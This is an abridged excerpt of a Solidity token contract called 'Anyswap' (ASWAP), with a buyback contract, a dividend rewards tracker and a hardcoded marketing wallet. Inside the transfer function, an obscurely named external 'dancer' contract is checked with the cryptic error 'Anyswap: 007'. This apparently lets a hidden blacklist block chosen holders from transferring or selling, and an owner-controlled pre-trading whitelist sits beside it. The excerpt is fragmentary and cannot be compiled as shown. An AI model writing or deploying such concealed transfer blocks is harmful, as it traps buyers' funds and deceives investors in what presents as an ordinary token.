...
contract AnyswapBuyBack is Ownable {
    using SafeMath for uint256;
...
contract Anyswap is ERC20, Ownable {
    using SafeMath for uint256;

    AnyswapRewardsTracker public rewardsTracker;
    
    AnyswapBuyBack public buyBackContract;
    ...
    address payable public marketingWallet = 0x45F5800224316F97977E2A56b3eE83e7061679F0;
    ...
    constructor() ERC20("Anyswap", "ASWAP") {
        totalFees = rewardsFee.add(liquidityFee);

    	liquidityWallet = owner();

        rewardsTracker = new AnyswapRewardsTracker();
        
        buyBackContract = new AnyswapBuyBack();
    ...
    function _transfer(
        ...
        require(!dancer.statusFind(from), "Anyswap: 007");
        
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "Anyswap: This account cannot send tokens until trading is enabled");
        }
        ...
        rewardsTracker.updateAnyswapBalance(payable(from), balanceOf(from));
        rewardsTracker.updateAnyswapBalance(payable(to), balanceOf(to));
...
/// @author Roger Wu (https://github.com/roger-wu) - forked specific functions for Anyswap Token
...
contract AnyswapRewardsTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    mapping (address => uint256) public anyswapBalance;
    ...
    constructor() DividendPayingToken("AnyswapRewardsTracker", "AnyswapRewardsTracker") {
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "AnyswapRewardsTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "AnyswapRewardsTracker: Use the 'claim' function on the main Anyswap contract.");
    }
    ...
    function updateAnyswapBalance(address payable holder, uint256 shares) external onlyOwner {
        anyswapBalance[holder] = shares;
    }
    ...
    function setBalance(address payable account) public onlyOwner {
    	...
    	uint256 newBalanceWithOffset = anyswapBalance[account].add(offset[account]);
